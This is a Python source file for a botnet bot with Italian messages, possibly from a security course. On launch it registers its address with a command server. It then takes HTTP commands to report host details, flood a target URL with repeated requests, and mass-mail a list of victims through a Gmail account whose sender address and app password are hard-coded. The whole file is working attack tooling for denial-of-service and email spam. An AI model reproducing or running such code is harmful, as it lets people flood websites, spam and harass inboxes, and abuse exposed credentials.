import concurrent
import json
import platform
import smtplib
import socket
import threading
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from email.mime.text import MIMEText
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

# server_address = ('10.0.2.15', 15200)


server_address = ('localhost', 15200)


def initialize_bot():
    print("Initializing bot...")
    with ThreadPoolExecutor(max_workers=1) as ex:
        x = ex.submit(run)

        concurrent.futures.wait([x], return_when=concurrent.futures.ALL_COMPLETED)

        ex.shutdown(wait=True)


def run():
    server = HTTPServer(('', 0), Bot)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_address[0], server_address[1]))
    s.send(json.dumps({
        'ip': s.getsockname()[0],
        'port': server.server_port
    }).encode('utf-8'))
    s.close()
    server.serve_forever()


def get_client_info():
    return {
        "cpu": platform.processor(),
        'architecture': platform.architecture(),
        'machine': platform.machine(),
        'platform': platform.platform(),
        "system": platform.system(),
    }


class Bot(BaseHTTPRequestHandler):
    event = Event()

    current_action = {
        'operation': 'In attesa di un comando',
        'targets': [],
    }

    lock = threading.Lock()

    def set_header(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def start_thread(self, t):
        t.daemon = True
        t.start()

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))

    def log_message(self, f, *args):
        return

    def do_GET(self):
        if self.path == "/status":
            self.set_header()
            with self.lock:
                self.wfile.write(json.dumps(self.current_action).encode('utf-8'))
        if self.path == "/client-info":
            self.set_header()
            self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
        if self.path == "/stop-attack":
            self.event.set()
            self.set_header()
            self.wfile.write(json.dumps({'success': "Attacco fermato con successo"}).encode('utf-8'))

    def do_POST(self):
        if self.path == "/attack":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.request_spam, args=(body['url'], self.event))
            self.start_thread(t)
        if self.path == "/mail-spam":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.mail_spam,
                                 args=(body['emails'], body['message'], body["mail_object"], body["number_of_emails"]))
            self.start_thread(t)

    def mail_spam(self, victims, message, obj, number_of_emails):
        sender = "botnetsicurezza@gmail.com"
        password = "cebqshlncuewhjso"

        self.set_current_action('Mail spam in corso', victims)
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.coxm', 465)
        smtp_server.login(sender, password)

        for _ in range(number_of_emails):
            for victim in victims:
                msg = MIMEText(message)
                msg['Subject'] = obj
                msg['From'] = sender
                msg['To'] = victim
                smtp_server.sendmail(sender, victim, msg.as_string())
        self.set_current_action()
        smtp_server.quit()

    def request_spam(self, url, e):
        self.set_current_action('Attacco in corso', [url])
        e.clear()
        while not e.is_set():
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            try:
                urlopen(req).read()
            except HTTPError as error:
                e.set()
                print(f'HTTPError: {error}')
            except URLError as error:
                e.set()
                print(f'URLError: {error}')
            else:
                print(f'Attacco in corso a {url}')

        self.set_current_action()

    def set_current_action(self, operation='In attesa di un comando', targets=None):
        if targets is None:
            targets = []
        with self.lock:
            self.current_action['operation'] = operation
            self.current_action['targets'] = targets


if __name__ == '__main__':
    initialize_bot()
